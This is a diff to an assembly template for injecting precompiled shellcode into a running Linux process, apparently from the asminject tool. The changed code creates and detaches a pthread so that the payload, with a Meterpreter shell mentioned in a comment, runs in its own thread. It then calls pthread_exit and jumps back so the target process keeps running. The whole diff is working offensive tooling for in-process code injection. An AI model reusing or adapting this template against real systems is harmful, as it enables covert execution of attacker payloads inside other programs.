@@ -8,15 +8,23 @@
 # happily execute in a separate thread, but if you execute the "exit" 
 # command from the Meterpreter shell, it will kill the entire target process
 
-mov rcx, 0
-lea rax, [VARIABLE:PRECOMPILED_SHELLCODE_LABEL:VARIABLE][rip]
-mov rdx, rax
+jmp execute_precompiled_threaded_main
+// import reusable code fragments 
+[FRAGMENT:asminject_libpthread_pthread_create.s:FRAGMENT]
+[FRAGMENT:asminject_libpthread_pthread_detach.s:FRAGMENT]
+[FRAGMENT:asminject_libpthread_pthread_exit.s:FRAGMENT]
+
+execute_precompiled_threaded_main:
+
 mov rsi, 0
-mov rax, arbitrary_read_write_data_address[rip]
-add rax, 0x1000		# don't overwrite anything important
-mov rdi, rax
-mov r9, [BASEADDRESS:.+/libpthread-[0-9\.so]+$:BASEADDRESS] + [RELATIVEOFFSET:pthread_create@@GLIBC.+:RELATIVEOFFSET]
-call r9
+mov rdi, arbitrary_read_write_data_address[rip]
+add rdi, 0x1000		# don't overwrite anything important
+mov rcx, 0
+lea rdx, [VARIABLE:PRECOMPILED_SHELLCODE_LABEL:VARIABLE][rip]
+push rdi
+call asminject_libpthread_pthread_create
+pop rdi
+call asminject_libpthread_pthread_detach
 
 [VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]:
 
@@ -24,6 +32,10 @@ call r9
 SHELLCODE_SECTION_DELIMITER
 
 [VARIABLE:INLINE_SHELLCODE:VARIABLE]
+
+# since this is threaded execution, exit the thread instead of returning
+mov rdi, 0
+call asminject_libpthread_pthread_exit
 
 jump_back_from_shellcode:
 
